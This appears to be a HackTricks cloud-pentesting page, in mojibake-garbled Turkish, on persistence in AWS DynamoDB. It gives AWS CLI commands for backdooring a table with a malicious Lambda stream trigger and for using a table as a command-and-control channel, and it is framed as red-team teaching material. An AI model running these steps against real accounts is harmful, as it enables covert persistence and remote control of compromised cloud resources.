# AWS - DynamoDB KalÄ±cÄ±lÄ±ÄŸÄ±

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

### DynamoDB

Daha fazla bilgi iÃ§in eriÅŸin:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Lambda Arka KapÄ±sÄ± ile DynamoDB Tetikleyicileri

DynamoDB tetikleyicilerini kullanarak, bir saldÄ±rgan kÃ¶tÃ¼ niyetli bir Lambda iÅŸlevini bir tabloyla iliÅŸkilendirerek **gizli bir arka kapÄ±** oluÅŸturabilir. Lambda iÅŸlevi, bir Ã¶ÄŸe eklendiÄŸinde, deÄŸiÅŸtirildiÄŸinde veya silindiÄŸinde tetiklenebilir ve saldÄ±rganÄ±n AWS hesabÄ± iÃ§inde rastgele kod Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

KalÄ±cÄ±lÄ±ÄŸÄ± sÃ¼rdÃ¼rmek iÃ§in, saldÄ±rgan DynamoDB tablosunda Ã¶ÄŸeler oluÅŸturabilir veya deÄŸiÅŸtirebilir, bu da kÃ¶tÃ¼ niyetli Lambda fonksiyonunu tetikler. Bu, saldÄ±rganÄ±n Lambda fonksiyonu ile doÄŸrudan etkileÅŸime girmeden AWS hesabÄ± iÃ§inde kod Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

### C2 KanalÄ± Olarak DynamoDB

Bir saldÄ±rgan, komutlar iÃ§eren Ã¶ÄŸeler oluÅŸturarak ve bu komutlarÄ± almak ve yÃ¼rÃ¼tmek iÃ§in ele geÃ§irilmiÅŸ instance'larÄ± veya Lambda fonksiyonlarÄ±nÄ± kullanarak bir DynamoDB tablosunu **komuta ve kontrol (C2) kanalÄ±** olarak kullanabilir.
```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```
Kompromize edilmiÅŸ instance'lar veya Lambda fonksiyonlarÄ± periyodik olarak C2 tablosunu yeni komutlar iÃ§in kontrol edebilir, bu komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir ve isteÄŸe baÄŸlÄ± olarak sonuÃ§larÄ± tabloya geri bildirebilir. Bu, saldÄ±rganÄ±n kompromize edilmiÅŸ kaynaklar Ã¼zerinde kalÄ±cÄ±lÄ±k ve kontrol saÄŸlamasÄ±na olanak tanÄ±r.

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
